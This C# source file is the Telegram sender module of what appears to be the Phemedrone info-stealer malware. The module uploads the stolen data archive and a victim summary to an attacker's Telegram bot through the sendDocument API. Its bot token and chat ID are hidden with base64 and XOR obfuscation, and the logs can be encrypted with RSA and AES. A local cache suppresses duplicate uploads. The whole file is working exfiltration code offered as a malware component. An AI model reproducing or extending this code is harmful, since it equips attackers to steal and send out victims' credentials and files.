using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using System.Xml.Serialization;
using Phemedrone.Services;

namespace Phemedrone.Senders
{
    public class Telegram : ISender
    {
        private readonly string _obfuscatedToken;
        private readonly string _obfuscatedChatId;
        private static Dictionary<string, DateTime> _sentFiles = new Dictionary<string, DateTime>();
        private static readonly object _lock = new object();
        private static readonly TimeSpan _duplicateWindow = TimeSpan.FromHours(24);
        private static readonly string _cacheFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "sent_files_cache.dat");
        private static string _currentBuildId = GetBuildIdentifier();

        public Telegram(string token, string chatId, string publicKey = null) : base(token, chatId, publicKey)
        {
            _obfuscatedToken = token;
            _obfuscatedChatId = chatId;
            LoadCache();
            CheckBuildChanged();
        }

        private static string GetBuildIdentifier()
        {
            // Используем комбинацию версии сборки и времени компиляции
            var assembly = Assembly.GetExecutingAssembly();
            var version = assembly.GetName().Version.ToString();
            var buildTime = File.GetLastWriteTime(assembly.Location).ToString("yyyyMMddHHmmss");
            return $"{version}_{buildTime}";
        }

        private void CheckBuildChanged()
        {
            var currentBuild = GetBuildIdentifier();
            if (_currentBuildId != currentBuild)
            {
                lock (_lock)
                {
                    _currentBuildId = currentBuild;
                    _sentFiles.Clear(); // Очищаем кэш при изменении билда
                    SaveCache();
                }
            }
        }

        public override void Send(byte[] data)
        {
            var fileName = Information.GetFileName();
            var now = DateTime.Now;

            lock (_lock)
            {
                CleanupOldEntries(); // Очищаем старые записи перед проверкой

                if (_sentFiles.TryGetValue(fileName, out var lastSentTime))
                {
                    if (now - lastSentTime < _duplicateWindow)
                    {
                        return; // Пропускаем дубликат
                    }
                }

                _sentFiles[fileName] = now; // Обновляем время отправки
                SaveCache(); // Сохраняем кэш
            }

            if (Config.EncryptLogs)
            {
                var key = DeserializeKey(Arguments.Last().ToString());
                data = Encrypt(data, key);
                fileName = fileName.Substring(0, fileName.Length - 4) + ".maklai";
            }

            var caption = Information.GetSummary();
            var token = Deobfuscate(_obfuscatedToken);
            var chatId = Deobfuscate(_obfuscatedChatId);

            MakeFormRequest($"https://api.telegram.org/bot{token}/sendDocument",
                "document", fileName, data,
                new KeyValuePair<string, string>("chat_id", chatId),
                new KeyValuePair<string, string>("parse_mode", "MarkdownV2"),
                new KeyValuePair<string, string>("caption", caption));
        }

        private void CleanupOldEntries()
        {
            var now = DateTime.Now;
            var oldKeys = _sentFiles.Where(x => now - x.Value > _duplicateWindow)
                                  .Select(x => x.Key)
                                  .ToList();

            foreach (var key in oldKeys)
            {
                _sentFiles.Remove(key);
            }
        }

        private void LoadCache()
        {
            try
            {
                if (!File.Exists(_cacheFilePath)) return;

                var lines = File.ReadAllLines(_cacheFilePath);
                if (lines.Length > 0)
                {
                    // Первая строка - идентификатор билда
                    var savedBuildId = lines[0];
                    if (savedBuildId != _currentBuildId)
                    {
                        // Если билд изменился, очищаем кэш
                        _sentFiles.Clear();
                        return;
                    }

                    // Остальные строки - данные кэша
                    for (int i = 1; i < lines.Length; i++)
                    {
                        var line = lines[i];
                        var parts = line.Split('|');
                        if (parts.Length == 2 && DateTime.TryParse(parts[1], out var time))
                        {
                            _sentFiles[parts[0]] = time;
                        }
                    }
                }

                CleanupOldEntries();
            }
            catch { /* Игнорируем ошибки чтения кэша */ }
        }

        private void SaveCache()
        {
            try
            {
                var lines = new List<string> { _currentBuildId };
                lines.AddRange(_sentFiles.Select(x => $"{x.Key}|{x.Value:O}"));
                File.WriteAllLines(_cacheFilePath, lines);
            }
            catch { /* Игнорируем ошибки записи кэша */ }
        }

        private static string Deobfuscate(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;

            try
            {
                var bytes = Convert.FromBase64String(input);
                for (var i = 0; i < bytes.Length; i++)
                {
                    bytes[i] = (byte)(bytes[i] ^ 0xAA);
                }
                return Encoding.UTF8.GetString(bytes);
            }
            catch
            {
                return input;
            }
        }

        private static RSAParameters DeserializeKey(string publicKey)
        {
            var ser = new XmlSerializer(typeof(RSAParameters));
            using (var reader = XmlReader.Create(new MemoryStream(Encoding.UTF8.GetBytes(publicKey))))
            {
                return (RSAParameters)ser.Deserialize(reader);
            }
        }

        private static byte[] Encrypt(byte[] data, RSAParameters publicKey)
        {
            using (var rsa = new RSACryptoServiceProvider())
            {
                rsa.ImportParameters(publicKey);

                using (var aes = Aes.Create())
                {
                    aes.GenerateKey();
                    var symmetricKey = aes.Key;
                    var plainVector = aes.IV;

                    byte[] encryptedData;
                    using (var memoryStream = new MemoryStream())
                    {
                        using (var cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cryptoStream.Write(data, 0, data.Length);
                            cryptoStream.FlushFinalBlock();
                            encryptedData = memoryStream.ToArray();
                        }
                    }

                    var encryptedSymmetricKey = rsa.Encrypt(symmetricKey, true);
                    var encryptedResult = new byte[encryptedSymmetricKey.Length + plainVector.Length + encryptedData.Length];

                    Buffer.BlockCopy(encryptedSymmetricKey, 0, encryptedResult, 0, encryptedSymmetricKey.Length);
                    Buffer.BlockCopy(plainVector, 0, encryptedResult, encryptedSymmetricKey.Length, plainVector.Length);
                    Buffer.BlockCopy(encryptedData, 0, encryptedResult, encryptedSymmetricKey.Length + plainVector.Length, encryptedData.Length);

                    return encryptedResult;
                }
            }
        }
    }
}